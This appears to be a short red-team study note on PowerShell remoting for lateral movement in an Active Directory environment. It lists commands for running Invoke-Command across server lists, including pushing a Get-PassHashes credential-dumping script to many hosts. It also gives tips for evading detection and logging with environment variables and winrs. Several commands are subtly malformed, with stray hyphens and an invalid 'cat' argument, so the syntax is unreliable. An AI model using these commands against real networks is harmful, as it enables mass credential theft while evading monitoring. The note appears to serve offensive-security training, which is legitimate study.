
# Connecting to PS Session

## One-to-One Connection

- `-New-PSSession <computer_name>`
- `-Enter-PSSession <computer_name>`


## One-to-Many Connection

- use $env.computername and $env.username instead of whoami to avoid detection
	- `-Invoke-Command -ScriptBlock{$env:computername;$env:username} -ComputerName <computer>`
![Pasted image 20260203033453](assets/Pasted%20image%2020260203033453.png)

- get servers from a list of server names
	- `-Invoke-Command -ScriptBlock{$env:computername;$env:username} -ComputerName cat C:\AD\Tools\servers.txt`


Execute commands or script blocks
- `Invoke-Command -Scriptblock {Get-Process} -ComputerName (Get-Content <list_of_servers>)`

Execute scripts from files
- `Invoke-Command -FilePath C:\scripts\Get-PassHashes.ps1 -ComputerName (Get-Content <list_of_servers>)`

Run locally loaded functions on the remote machines
- `Invoke-Command -ScriptBlock ${function:Get-PassHashes} -ComputerName (Get-Content <list_of_servers>)`
- keep in mind that only positional arguments can be passed this way
	- `Invoke-Command -ScriptBlock ${function:Get-PassHashes} -ComputerName (Get-Content <list_of_servers>) -ArgumentList`

Execute stateful (PSSession) commands using `Invoke-Command`
- `$Sess = New-PSSession -ComputerName <computer>`
- `Invoke-Command -Session $Sess -ScriptBlock {$Proc = Get-Process}`
- `Invoke-Command -Session $Sess -ScriptBlock {$Proc.Name}`


Can use winrs instead of PSRemoting to evade logging and still get benefits of 5985
- `winrs -remote:<computer> -u:<computer>\<user> -p:<pass> hostname`